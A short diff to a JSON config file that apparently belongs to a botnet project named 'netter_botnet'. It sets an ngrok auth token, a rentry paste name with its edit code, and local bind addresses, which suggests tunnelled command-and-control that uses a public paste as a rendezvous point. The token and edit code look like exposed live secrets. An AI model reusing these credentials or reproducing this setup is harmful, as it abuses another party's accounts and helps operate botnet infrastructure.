@@ -1,5 +1,10 @@
 {
     "ngrokAuthToken": "2aqIya1ifyF3PwhV11YIeRYPHI9_7RpZTeF9uE5jUbd3FtnUV",
     "defaultBindAddress": "127.0.0.1:5000",
-    "rentryUrl": {"url_name": "netter_botnet", "edit_code": "924450817Gg"}
+    "rentryUrl": {
+        "url_name": "netter_botnet",
+        "edit_code": "924450817Gg"
+    },
+
+    "serverSideAddress": "127.0.0.1:2211"
 }
